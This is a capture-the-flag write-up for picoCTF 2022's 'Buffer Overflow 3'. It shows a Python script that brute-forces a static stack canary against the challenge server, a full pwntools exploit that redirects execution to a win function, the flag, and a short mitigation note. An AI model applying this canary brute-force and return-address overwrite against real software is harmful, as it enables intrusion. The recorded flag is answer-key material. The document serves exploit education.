## CTF: picoCTF 2022

Challenge: Buffer Overflow 3

Points: 10

Category: pwn

Difficulty: Advanced

## Instructions

Do you think you can bypass the protection and get the flag?

## Solution

### Brute Force Canary

You are given a program called vuln:

```bash
$ file vuln
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, not stripped

$ checksec vuln
[*] '/home/shinigami/DrBrown/vuln'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

32-bit, no compiler canary, no PIE. Just because checksec didn't find a canary doesn't mean the developer didn't put their own in. The program asks for canary.txt — the developer made a static canary. When we overflow past it:

```
***** Stack Smashing Detected ***** : Canary Value Corrupt!
```

Since this is a 32-bit executable with a static canary read from a file, we can brute-force it byte by byte. Using gdb, we find the buffer to canary distance is 64 bytes.

```python
canary = b""
count = 0
win_addr = 0x08049236
while(count < 4):
    for i in range(0x00,0x7f):
        p = remote("xebec.cylabacademy.net",48518)
        payload = b"A" * 64 + canary + bytes(chr(i),"utf-8")
        p.sendline("84")
        p.send(payload)
        info = p.recvall()
        if("Smashing" in str(info)):
            continue
        else:
            canary += bytes(chr(i),"utf-8")
            count = count + 1
            break
```

Found canary: `b"BiRd"`. Win function at 0x08049236. Return address is 16 bytes after canary.

### Full Exploit

```python
from pwn import *

elf = context.binary = ELF("./vuln")
canary = b"BiRd"
p = remote("xebec.cylabacademy.net",48518)
payload = b"A" * 64  + canary + b"A" * 16 + p32(0x08049236)
p.sendline("100")
p.send(payload)
print(p.recvline())
p.interactive()
```

## Flag

```
academy{Stat1C_c4n4r13s_4R3_b4D_77f0b53c}
```

## Mitigation

Don't use a static canary. This makes guessing the canary possible. Use built-in stack protections from the compiler.
